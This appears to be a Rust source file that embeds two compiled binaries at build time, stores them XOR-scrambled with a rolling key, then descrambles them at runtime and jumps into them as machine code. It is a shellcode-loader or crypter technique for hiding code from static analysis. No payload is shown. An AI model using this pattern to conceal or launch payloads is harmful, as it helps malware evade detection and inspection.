use core::mem::transmute;

#[repr(C, align(16))]
struct Aligned<T: ?Sized>(T);

static mut ENCRYPTED: Aligned<[u8; include_bytes!(env!("CB1_BIN")).len() ]> = gen_crypt();//Aligned(*include_bytes!(env!("CB0_BIN")));
static mut ENCRYPTED_SECONDARY: Aligned<[u8; include_bytes!(env!("CB1S_BIN")).len() ]> = gen_crypt_secondary();//Aligned(*include_bytes!(env!("CB0_BIN")));

pub const fn gen_crypt() -> Aligned<[ u8; include_bytes!(env!("CB1_BIN")).len() ]> {
    let mut initial = *include_bytes!(env!("CB1_BIN"));
    symmetric_scramble(&mut initial);
    Aligned(initial)
}

pub const fn gen_crypt_secondary() -> Aligned<[ u8; include_bytes!(env!("CB1S_BIN")).len() ]> {
    let mut initial = *include_bytes!(env!("CB1S_BIN"));
    symmetric_scramble(&mut initial);
    Aligned(initial)
}

pub fn run() {
    unsafe {
        let encrypted =  &mut *&raw mut ENCRYPTED;
        symmetric_scramble(&mut encrypted.0);
        let ptr = encrypted.0.as_ptr();
        let func: extern "C" fn() = transmute(ptr);
        (func)();
    }
}

pub fn run_secondary() {
    unsafe {
        let encrypted =  &mut *&raw mut ENCRYPTED_SECONDARY;
        symmetric_scramble(&mut encrypted.0);
        let ptr = encrypted.0.as_ptr();
        let func: extern "C" fn() = transmute(ptr);
        (func)();
    }
}

pub const fn symmetric_scramble(buf: &mut [u8]) {
    let mut index = 0;
    let mut acc = 67676767;
    while index < buf.len() - (buf.len() % 4) {
        let mut current = u32::from_be_bytes([buf[index], buf[index+1], buf[index+2], buf[index+3]]);

        current = current ^ acc;

        let bytes = current.to_be_bytes();
        buf[index] = bytes[0];
        buf[index+1] = bytes[1];
        buf[index+2] = bytes[2];
        buf[index+3] = bytes[3];

        index += 4;
        acc = acc.wrapping_add(2152764943);
    }
}